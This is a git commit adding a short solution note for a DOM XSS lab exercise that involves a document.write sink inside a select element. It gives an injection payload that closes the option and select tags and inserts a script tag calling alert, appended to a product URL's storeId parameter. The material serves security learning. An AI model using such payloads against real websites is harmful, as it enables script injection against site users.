7d52832ea5c3baef7179da9bf395692e9f856361
Paula Fernandes <paula@MacBook-Air-de-Paula.local>
2022-01-22 18:56:14 -0300

    Anwser of DOM XSS in document.write sink using source location.search inside a select element

---
+++ xss/local_tests/DOM XSS in document.write sink using source location.search inside a select element.js
@@ -0,0 +1,8 @@
+
+1. You write the follow content at URL of products.
+
+2</option></select><script>alert("ola");</script><select>
+
+
+Example
+product?productId=1&storeId=2</option></select><script>alert("ola");</script><select>
